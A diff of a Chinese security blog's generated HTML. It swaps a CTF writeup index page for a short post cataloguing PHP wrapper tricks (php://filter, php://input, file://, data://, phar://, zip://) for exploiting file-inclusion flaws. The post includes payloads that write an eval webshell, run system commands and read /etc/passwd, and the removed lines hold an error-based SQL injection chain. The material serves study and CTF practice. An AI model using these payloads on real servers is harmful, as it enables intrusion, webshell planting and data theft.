@@ -66,7 +66,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="PHP,">
 
 
 
@@ -77,16 +77,18 @@
 
 
 
-<meta name="description" content="人的一生应该这样度过:不因虚度年华而悔恨，也不因碌碌无为而羞愧">
-<meta property="og:type" content="website">
-<meta property="og:title" content="故人梦">
-<meta property="og:url" content="http://yoursite.com/page/2/index.html">
+<meta name="description" content="PHP伪协议是PHP内置的URL风格的封装协议，也就是为什么在文件包含的漏洞利用中有的需要开启 allow_url_fopen 或者 allow_url_include 的原因。">
+<meta name="keywords" content="PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP伪协议用法的简单记录">
+<meta property="og:url" content="http://yoursite.com/2019/05/30/PHP伪协议用法的简单记录/index.html">
 <meta property="og:site_name" content="故人梦">
-<meta property="og:description" content="人的一生应该这样度过:不因虚度年华而悔恨，也不因碌碌无为而羞愧">
+<meta property="og:description" content="PHP伪协议是PHP内置的URL风格的封装协议，也就是为什么在文件包含的漏洞利用中有的需要开启 allow_url_fopen 或者 allow_url_include 的原因。">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-05-30T00:59:08.932Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="故人梦">
-<meta name="twitter:description" content="人的一生应该这样度过:不因虚度年华而悔恨，也不因碌碌无为而羞愧">
+<meta name="twitter:title" content="PHP伪协议用法的简单记录">
+<meta name="twitter:description" content="PHP伪协议是PHP内置的URL风格的封装协议，也就是为什么在文件包含的漏洞利用中有的需要开启 allow_url_fopen 或者 allow_url_include 的原因。">
 
 
 
@@ -116,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/page/2/">
+  <link rel="canonical" href="http://yoursite.com/2019/05/30/PHP伪协议用法的简单记录/">
 
 
 
 
 
-  <title>故人梦</title>
+  <title>PHP伪协议用法的简单记录 | 故人梦</title>
   
 
 
@@ -141,8 +143,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -265,9 +266,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -280,7 +281,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/20/DDCTF2019 MISC wireshark/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/30/PHP伪协议用法的简单记录/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="故人梦">
@@ -297,9 +298,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/20/DDCTF2019 MISC wireshark/" itemprop="url">DDCTF2019 MISC wireshark</a></h1>
+          <h1 class="post-title" itemprop="name headline">PHP伪协议用法的简单记录</h1>
         
 
         <div class="post-meta">
@@ -311,8 +310,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-20T00:00:00+08:00">
-                2019-04-20
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-30T00:00:00+08:00">
+                2019-05-30
               </time>
             
 
@@ -334,8 +333,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
+                  <a href="/categories/漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
                   </a>
                 </span>
 
@@ -365,7 +364,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  373 字
+                  408 字
                 </span>
               
 
@@ -381,12 +380,16 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1 分钟
+                  2 分钟
                 </span>
               
             </div>
           
 
+          
+              <div class="post-description">
+                  PHP伪协议是PHP内置的URL风格的封装协议，也就是为什么在文件包含的漏洞利用中有的需要开启 allow_url_fopen 或者 allow_url_include 的原因。
+              </div>
           
 
         </div>
@@ -402,16 +405,23 @@
       
 
       
-        
-          <h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h3><p>该题的流量包文件：<br><code>链接：https://pan.baidu.com/s/1k5EcRKkeSun5nzhyvPdqlg 密码：i8sh</code><br>使用wireshark打开这个流量包文件，观察发现里面的http流量包应该是有东西的，然后http流量包过滤  </p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/04/20/DDCTF2019 MISC wireshark/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+        <h3 id="php伪协议的常见用法"><a href="#php伪协议的常见用法" class="headerlink" title="php伪协议的常见用法"></a>php伪协议的常见用法</h3><p>PHP伪协议用于文件包含中，通常有以下几种利用方式：  </p>
+<h4 id="php-filter-本地磁盘文件进行读取-："><a href="#php-filter-本地磁盘文件进行读取-：" class="headerlink" title="php://filter   (本地磁盘文件进行读取)："></a>php://filter   (本地磁盘文件进行读取)：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用法：</span><br><span class="line">?filename=php:<span class="comment">//filter/convert.base64-encode/resource=xxx.php</span></span><br><span class="line">?filename=php:<span class="comment">//filter/read=convert.base64-encode/resource=xxx.php</span></span><br><span class="line"></span><br><span class="line">也可以执行写入操作(需结合特定环境)：</span><br><span class="line">?filename=php:<span class="comment">//filter/write=convert.base64-encode/resource=xxx.php</span></span><br></pre></td></tr></table></figure>
+<p><strong>只是读取数据流，需要开启 allow_url_fopen，不需要开启 allow_url_include</strong>  </p>
+<h4 id="php-input-写木马，读取post数据，命令执行"><a href="#php-input-写木马，读取post数据，命令执行" class="headerlink" title="php://input   (写木马，读取post数据，命令执行)"></a>php://input   (写木马，读取post数据，命令执行)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(写入木马，通过POST传入数据)</span><br><span class="line">用法：</span><br><span class="line">GET: ?path=php:<span class="comment">//input</span></span><br><span class="line">POST: <span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>, <span class="string">'w'</span>), <span class="string">'&lt;?php @eval($_POST[cmd]);?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(读取POST数据)</span><br><span class="line">用法：</span><br><span class="line">GET：?path=php:<span class="comment">//input</span></span><br><span class="line">POST: test post</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(命令执行)</span><br><span class="line">用法：</span><br><span class="line">GET: ?path=php:<span class="comment">//input</span></span><br><span class="line">POST: <span class="meta">&lt;?php</span> system(<span class="string">'whoami'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>需要allow_url_fopen 和 allow_url_include 都开启</strong></p>
+<h4 id="file-伪协议-读取文件内容"><a href="#file-伪协议-读取文件内容" class="headerlink" title="file://伪协议(读取文件内容)"></a>file://伪协议(读取文件内容)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用法：</span><br><span class="line">windows: ?path=file:<span class="comment">//c:/log.txt</span></span><br><span class="line">linux: ?path=file:<span class="comment">///etc/passwd</span></span><br></pre></td></tr></table></figure>
+<p><strong>无需开启allow_url_fopen 和 allow_url_include</strong></p>
+<h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">读取post数据：</span><br><span class="line">GET：?path=data:<span class="comment">//text/plain;base64,SSBsb3ZlIFBIUAo=</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令执行：</span><br><span class="line">GET: ?path=data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span></span><br><span class="line">(php版本仅 <span class="number">7.0</span>.x 测试成功)</span><br></pre></td></tr></table></figure>
+<p><strong>需要开启 allow_url_fopen 和 allow_url_include</strong>  </p>
+<h4 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用法：</span><br><span class="line">?file=phar:<span class="comment">//压缩包/内部文件</span></span><br><span class="line">eg: ?file=phar:<span class="comment">//xxx.png/shell.php</span></span><br><span class="line">(使用zip协议将木马压缩成zip文件，然后改后缀为 png 或其他允许上传的文件后缀)</span><br></pre></td></tr></table></figure>
+<p><strong>无需开启allow_url_fopen 和 allow_url_include</strong>  </p>
+<h4 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h4><p>和phar协议类似，但是用法不一样。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用法：</span><br><span class="line">?file=zip:<span class="comment">//压缩文件绝对路径#压缩文件内的子文件名</span></span><br><span class="line">eg: ?file=zip:<span class="comment">//xxx.png%23shell.php</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>无需开启 allow_url_fopen 和 allow_url_include</strong></p>
+
       
     </div>
     
@@ -426,369 +436,36 @@
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/15/掘安杯writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="故人梦">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="故人梦">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/15/掘安杯writeup/" itemprop="url">掘安杯writeup</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-15T00:00:00+08:00">
-                2019-04-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
+        <div class="post-tags">
           
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
           
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1,162 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  6 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
         </div>
-      </header>
-    
+      
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
+      
       
       
 
       
-        
-          <h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h5 id="真的不是图片"><a href="#真的不是图片" class="headerlink" title="真的不是图片"></a>真的不是图片</h5><p>binwalk发现有一个zip文件，但是使用foremost分离不出来，猜测可能是少了zip文件头</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/04/15/掘安杯writeup/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/30/对万金油gopher协议的理解与应用/" rel="next" title="对万金油gopher协议的理解与应用">
+                <i class="fa fa-chevron-left"></i> 对万金油gopher协议的理解与应用
+              </a>
+            
           </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
 
-    
+          <span class="post-nav-divider"></span>
 
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/09/嘉韦思杯部分writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="故人梦">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="故人梦">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/09/嘉韦思杯部分writeup/" itemprop="url">嘉韦思杯部分writeup</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+          <div class="post-nav-prev post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-09T00:00:00+08:00">
-                2019-04-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1,824 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  8 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          <h3 id="土肥原贤二-WEB-报错注入"><a href="#土肥原贤二-WEB-报错注入" class="headerlink" title="土肥原贤二(WEB 报错注入)"></a>土肥原贤二(WEB 报错注入)</h3><p>字符型报错注入，直接一套payload带走<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">' and updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">-- -</span></span><br><span class="line">luozhen</span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>luozhen<span class="string">'),0x7e),1)-- -</span></span><br><span class="line"><span class="string">flag,goods</span></span><br><span class="line"><span class="string">'</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">-- -</span></span><br><span class="line"><span class="keyword">id</span>,flag</span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select flag from flag),0x7e),1)-- -</span></span><br></pre></td></tr></table></figure></p>
-<p>得到flag：flag{20_welcome_19}</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/04/09/嘉韦思杯部分writeup/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -798,14 +475,11 @@
   </article>
 
 
-    
-  </section>
 
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-  </nav>
-
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -813,6 +487,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -833,8 +511,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -894,6 +581,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#php伪协议的常见用法"><span class="nav-number">1.</span> <span class="nav-text">php伪协议的常见用法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php-filter-本地磁盘文件进行读取-："><span class="nav-number">1.1.</span> <span class="nav-text">php://filter   (本地磁盘文件进行读取)：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-input-写木马，读取post数据，命令执行"><span class="nav-number">1.2.</span> <span class="nav-text">php://input   (写木马，读取post数据，命令执行)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#file-伪协议-读取文件内容"><span class="nav-number">1.3.</span> <span class="nav-text">file://伪协议(读取文件内容)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data-伪协议"><span class="nav-number">1.4.</span> <span class="nav-text">data://伪协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phar-伪协议"><span class="nav-number">1.5.</span> <span class="nav-text">phar://伪协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#zip-伪协议"><span class="nav-number">1.6.</span> <span class="nav-text">zip://伪协议</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -1057,6 +760,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
